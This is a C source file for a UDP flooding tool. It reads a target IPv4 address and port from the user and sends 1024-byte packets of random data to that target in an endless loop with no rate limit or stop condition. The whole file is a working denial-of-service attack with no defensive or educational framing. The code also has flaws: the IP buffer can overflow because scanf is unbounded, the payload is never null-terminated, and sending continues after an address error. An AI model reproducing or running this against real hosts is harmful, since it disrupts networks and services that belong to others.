#include<stdio.h> 
#include<stdlib.h> 
#include<unistd.h> 
#include<string.h> 
#include<sys/types.h> 
#include<sys/socket.h> 
#include<arpa/inet.h> 
#include<netinet/in.h> 
#include<time.h>

int main()
{

	char message[1024] = "";
	int lower=32,upper=132;
	srand(time(0));
	for (int i=0; i<1024; i++)
	{
        int num = (rand() %
           (upper - lower + 1)) + lower;
        ;
		message[i]=num;
	}
	char *packet = message;

	char ip[15]= "";
	printf("IPv4: ");
	scanf("%s",ip);

	int PORT;
	printf("PORT: ");
	scanf("%d",&PORT);

	int sockfd;
	struct sockaddr_in servaddr;

    if ( (sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) {
        perror("socket creation failed"); 
        exit(EXIT_FAILURE); 
    } 
  
    memset(&servaddr, 0, sizeof(servaddr)); 

    servaddr.sin_family = AF_INET; 
    servaddr.sin_port = htons(PORT); 
    if(inet_pton(AF_INET,ip,&servaddr.sin_addr.s_addr) <= 0)
	{
		perror("error in address");
		close(sockfd);
	} 
    
	while(1)
	{  
    sendto(sockfd, (const char *)packet, strlen(packet), 
        MSG_CONFIRM, (const struct sockaddr *) &servaddr,  
            sizeof(servaddr)); 
    }
  
    close(sockfd); 
    return 0; 
}

